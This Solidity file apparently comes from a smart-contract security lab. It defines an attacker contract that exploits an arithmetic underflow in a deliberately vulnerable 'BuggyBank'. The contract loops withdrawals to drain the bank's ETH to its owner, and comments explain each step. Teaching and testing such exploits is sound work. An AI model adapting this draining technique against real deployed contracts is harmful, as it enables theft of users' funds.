// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../contracts/Vulnerable.sol";

/// @notice Repeatedly withdraw to exploit underflowed balance.
contract ArithmeticAttacker {
    BuggyBank public bank;
    address public owner;

    constructor(BuggyBank _bank) {
        bank = _bank;
        owner = msg.sender;
    }

    function attack(uint256 initialDeposit, uint256 singleWithdraw, uint256 maxIterations) external {
        require(msg.sender == owner, "not owner");

        // Seed the bank with our initial deposit so require() passes the first time.
        bank.deposit{value: initialDeposit}();

        // First withdraw equal to our deposit triggers underflow because fee > 0.
        bank.withdraw(singleWithdraw);

        // After underflow, our recorded balance is ~2^256 - fee, so we can loop withdrawals.
        for (uint256 i = 0; i < maxIterations; i++) {
            if (address(bank).balance == 0) break;
            // Withdraw in chunks to avoid running out of gas.
            uint256 chunk = address(bank).balance > singleWithdraw ? singleWithdraw : address(bank).balance;
            if (chunk == 0) break;
            bank.withdraw(chunk);
        }

        // Send profit to owner EOA.
        payable(owner).transfer(address(this).balance);
    }

    // Receive drained ETH
    receive() external payable {}
}
